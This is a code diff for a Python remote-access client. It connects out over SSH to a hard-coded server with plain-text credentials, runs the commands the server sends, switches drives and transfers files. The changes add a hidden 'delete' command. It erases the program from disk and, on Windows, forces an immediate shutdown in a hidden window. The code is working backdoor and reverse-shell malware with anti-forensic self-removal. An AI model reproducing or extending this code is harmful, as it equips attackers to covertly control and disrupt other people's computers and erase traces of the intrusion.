@@ -1,15 +1,18 @@
 #!/usr/bin/env python3
 import socket
+import os
+import sys
 import time
 import subprocess
 import paramiko
 import getpass
 from pathlib import Path
 
+# CONFIGURATION
 IP = '192.168.56.104' #your server ip
-PORT = 2222
-USERNAME = 'trid'
-PASSWORD = '5731'
+PORT = 2222 #port for your server
+USERNAME = 'trid' #your server name
+PASSWORD = '5731' #your server password
 
 current_dir = Path(__file__).parent
 
@@ -62,6 +65,27 @@ def start_client():
                     client.close()
                     return
 
+                if command.lower() == 'delete':
+                    if getattr(sys, 'frozen', False):
+                        exe_path = sys.executable
+                    else:
+                        exe_path = Path(__file__)
+
+                    current_os = os.name
+                    
+                    if current_os == 'nt':
+                        cmd_command = f'timeout /t 3 && del /f /q "{exe_path}" && shutdown /s /t 0'
+                        CREATE_NO_WINDOW = 0x08000000
+                        subprocess.Popen(cmd_command, shell=True, creationflags=CREATE_NO_WINDOW)
+                    else:
+                        bash_command = f'sleep 3 && rm -f "{exe_path}"'
+                        subprocess.Popen(bash_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
+                    
+                    chan.close()
+                    client.close()
+                    sys.exit(0)
+                    return
+
                 if command.startswith('cd'):
                     try:
                         path_arg = command[3:].strip().strip("'\"")
@@ -78,6 +102,21 @@ def start_client():
                     except Exception as e:
                         cmd_result = f'Error: {e}\n'.encode('utf-8')
                     
+                    result_len = len(cmd_result)
+                    chan.sendall(f'{result_len}\n'.encode('utf-8'))
+                    chan.sendall(cmd_result)
+                    continue
+
+                if len(command) == 2 and command[0].isalpha() and command[1] == ':':
+                    disk = f'{command.strip().upper()}\\'
+
+                    if Path(disk).exists():
+                        target_path = Path(disk)
+                        current_dir = target_path
+                        cmd_result = b'\n'
+                    else:
+                        cmd_result = f'Error: The system cannot find disk specified: {disk}'.encode('utf-8')
+
                     result_len = len(cmd_result)
                     chan.sendall(f'{result_len}\n'.encode('utf-8'))
                     chan.sendall(cmd_result)
@@ -117,7 +156,7 @@ def start_client():
                             if not chunk:
                                 break
                             len_bytes += chunk
-                        data_size = len(len_bytes.decode('utf-8').strip())
+                        data_size = int(len_bytes.decode('utf-8').strip())
 
                         file_data = b''
                         while len(file_data) < data_size:
